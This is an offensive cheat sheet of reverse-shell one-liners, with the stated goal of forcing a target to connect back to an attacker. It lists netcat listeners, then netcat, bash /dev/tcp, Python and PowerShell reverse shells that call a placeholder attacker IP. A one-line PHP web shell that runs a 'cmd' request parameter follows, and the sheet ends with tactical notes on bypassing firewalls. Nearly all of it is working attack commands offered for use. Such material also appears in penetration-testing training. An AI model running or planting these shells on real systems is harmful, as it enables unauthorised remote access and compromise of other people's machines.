# Reverse Shells

Goal: Force target to connect back to attacker.

---

# Netcat Listener

nc -lvnp <port>

sudo nc -lvnp <port>

---

# Netcat Reverse Shell (Linux)

nc -nv <ip> <port>

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f

---

# Bash Reverse Shell

bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1

---

# Python Reverse Shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

---

# PowerShell Reverse Shell

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

---

# PHP Reverse Shell

<?php system($_REQUEST['cmd']); ?>

---

# Tactical Notes

- Always start listener first.
- Prefer reverse shell over bind shell (bypasses firewall).
- Upgrade to interactive shell immediately.
